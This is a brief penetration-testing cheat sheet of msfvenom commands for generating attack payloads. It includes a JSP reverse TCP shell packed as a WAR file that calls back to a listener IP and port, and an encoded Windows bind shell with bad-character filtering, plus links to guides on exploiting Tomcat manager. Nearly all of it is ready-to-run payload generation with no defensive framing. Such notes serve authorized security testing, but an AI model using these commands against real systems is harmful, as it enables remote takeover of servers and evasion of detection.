# Generating Attack Payload

## MSFvenom

    $ msfvenom -p [payload] -f [format] LHOST=[your ip] LPORT=[your listener port]
    $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.108 LPORT=1234 -f war > shell.war
    $ msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python

## References

* https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/
* https://www.offensive-security.com/metasploit-unleashed/msfvenom/
* https://medium.com/@hakluke/haklukes-guide-to-hacking-without-metasploit-1bbbe3d14f90